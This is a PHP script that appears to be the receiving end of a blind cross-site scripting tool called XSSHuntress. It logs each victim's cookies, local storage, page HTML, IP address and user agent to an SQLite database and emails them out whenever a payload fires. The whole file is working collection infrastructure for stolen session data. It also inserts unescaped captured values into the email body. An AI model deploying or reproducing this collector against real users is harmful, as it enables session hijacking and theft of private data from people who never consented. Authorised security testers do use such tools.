<?php
error_reporting(E_ALL); 
ini_set('display_errors', 'On');
// Include PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require '/home/pi/vendor/phpmailer/phpmailer/src/Exception.php';
require '/home/pi/vendor/phpmailer/phpmailer/src/PHPMailer.php';
require '/home/pi/vendor/phpmailer/phpmailer/src/SMTP.php';

// Database file
$db_file = 'data.sqlite';

// Create a new database connection
$db = new PDO('sqlite:' . $db_file);

// Create table if not exists
$db->exec("CREATE TABLE IF NOT EXISTS data (
    id INTEGER PRIMARY KEY, 
    time TEXT, 
    url TEXT, 
    referrer TEXT, 
    ip TEXT, 
    user_agent TEXT, 
    cookies TEXT, 
    local_storage TEXT, 
    html TEXT)");

// Get data from request
$time = $_POST['time'];
$url = $_POST['url'];
$referrer = $_SERVER['HTTP_REFERER'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$cookies = $_POST['cookies'];
$local_storage = $_POST['local_storage'];
$html = $_POST['html'];

// Prepare SQL statement
$stmt = $db->prepare("INSERT INTO data (time, url, referrer, ip, user_agent, cookies, local_storage, html) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");

// Execute SQL statement with data
$stmt->execute([$time, $url, $referrer, $ip, $user_agent, $cookies, $local_storage, $html]);

// Create a new PHPMailer instance
$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->SMTPDebug = 2; // Enable verbose debug output
    $mail->isSMTP(); // Set mailer to use SMTP
    $mail->Host = 'smtp.example.com'; // Specify main and backup SMTP servers
    $mail->SMTPAuth = true; // Enable SMTP authentication
    $mail->Username = 'user@example.com'; // SMTP username
    $mail->Password = 'secret'; // SMTP password
    $mail->SMTPSecure = 'tls'; // Enable TLS encryption, `ssl` also accepted
    $mail->Port = 587; // TCP port to connect to

    // Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User'); // Add a recipient


    // Content
    $mail->isHTML(true); // Set email format to HTML
    $mail->Subject = 'XSSHuntress Notification - Payload Fired';
    $mail->Body    = "New entry added to the database:<br /><br />
                      <dt style='background:#f5f5f5'>Time:</dt> <dd>$time</dd><br />
                      <dt style='background:#f5f5f5'>URL:</dt> <dd>$url</dd><br />
                      <dt style='background:#f5f5f5'>Referrer:</dt> <dd>$referrer</dd><br />
                      <dt style='background:#f5f5f5'>IP:</dt> <dd>$ip</dd><br />
                      <dt style='background:#f5f5f5'>User Agent:</dt> <dd>$user_agent</dd><br />
                      <dt style='background:#f5f5f5'>Cookies:</dt> <dd>$cookies</dd><br />
                      <dt style='background:#f5f5f5'>Local Storage:</dt> <dd>$local_storage</dd><br />
                      <dt style='background:#f5f5f5'>HTML:</dt> <dd>" . htmlspecialchars($html) . "</dd>";

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
?>